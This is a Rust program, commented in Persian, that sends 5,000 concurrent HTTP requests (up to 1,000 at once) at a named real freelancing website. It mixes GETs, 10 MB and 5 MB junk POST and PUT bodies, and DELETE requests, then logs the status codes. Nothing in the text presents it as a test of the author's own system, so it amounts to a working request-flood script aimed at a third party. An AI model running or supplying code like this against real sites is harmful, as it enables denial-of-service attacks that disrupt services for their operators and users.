use reqwest::Client;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::{self, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // پیکربندی کلاینت HTTP با استفاده از Keep-Alive
    let client = Client::builder()
        .timeout(Duration::from_secs(5)) // تنظیم تایم‌آوت
        .pool_idle_timeout(Duration::from_secs(60)) // زمان زنده ماندن اتصال در استخر
        .build()?;

    let url = "https://www.karlancer.com";
    let concurrency_limit = 1000; // تعداد درخواست‌های همزمان
    let request_count = 5000; // تعداد کل درخواست‌ها
    let request_timeout = Duration::from_secs(5); // تایم‌آوت هر درخواست

    // استفاده از Semaphore برای کنترل همزمانی
    let semaphore = Arc::new(Semaphore::new(concurrency_limit));
    let mut handles = vec![];

    for i in 0..request_count {
        let semaphore = semaphore.clone();
        let client = client.clone();
        let url = url.to_string();

        let handle = tokio::spawn(async move {
            // گرفتن مجوز از Semaphore
            let _permit = match semaphore.acquire().await {
                Ok(permit) => permit,
                Err(_) => {
                    eprintln!("Failed to acquire semaphore permit");
                    return;
                }
            };

            // انتخاب نوع درخواست بر اساس شمارنده
            let request_future = match i % 4 {
                0 => {
                    // GET درخواست
                    client.get(&url).send()
                }
                1 => {
                    // POST درخواست با داده بزرگ
                    let data = vec![0; 10 * 1024 * 1024]; // 10 مگابایت داده
                    client.post(&url).body(data).send()
                }
                2 => {
                    // PUT درخواست
                    let data = vec![1; 5 * 1024 * 1024]; // 5 مگابایت داده
                    client.put(&url).body(data).send()
                }
                3 => {
                    // DELETE درخواست
                    client.delete(&url).send()
                }
                _ => unreachable!(),
            };

            // تنظیم تایم‌آوت برای درخواست
            let result = time::timeout(request_timeout, request_future).await;

            // مدیریت نتیجه درخواست
            match result {
                Ok(Ok(response)) => {
                    if response.status().is_success() {
                        println!("Request successful, Status: {}", response.status());
                    } else {
                        println!("Request failed, Status: {}", response.status());
                    }
                }
                Ok(Err(err)) => {
                    eprintln!("Request error: {}", err);
                }
                Err(_) => {
                    eprintln!("Request timed out");
                }
            }
        });

        handles.push(handle);
    }

    // منتظر ماندن برای اتمام تمام درخواست‌ها
    for handle in handles {
        if let Err(err) = handle.await {
            eprintln!("Handle error: {}", err);
        }
    }

    Ok(())
}
